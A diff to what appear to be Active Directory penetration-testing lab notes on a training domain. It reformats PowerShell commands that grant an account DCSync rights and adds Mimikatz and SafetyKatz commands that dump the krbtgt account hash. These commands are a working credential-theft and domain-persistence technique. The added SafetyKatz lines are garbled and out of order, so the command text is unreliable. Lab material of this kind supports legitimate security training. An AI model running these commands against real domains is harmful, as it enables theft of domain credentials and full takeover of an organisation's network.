@@ -550,9 +550,7 @@ Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=mone
 
 
 ```powershell
-Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentitystudent1 -Rights DCSync -PrincipalDomain
-dollarcorp.moneycorp.local -TargetDomain
-dollarcorp.moneycorp.local -Verbose
+Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
 ```
 
 
@@ -560,7 +558,24 @@ dollarcorp.moneycorp.local -Verbose
 
 
 ```powershell
-Set-ADACL -SamAccountName studentuser1 -DistinguishedName
-'DC=dollarcorp,DC=moneycorp,DC=local' -GUIDRight DCSync -
-Verbose
+Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -GUIDRight DCSync -Verbose
 ```
+
+
+Execute DCSync:
+
+
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync
+/user:dcorp\krbtgt"'
+```
+
+
+or
+
+```
+C:\AD\Tools\SafetyKatz.exe
+/user:dcorp\krbtgt" "exit"
+```
+AlteredSecurity
+"lsadump::dcsync
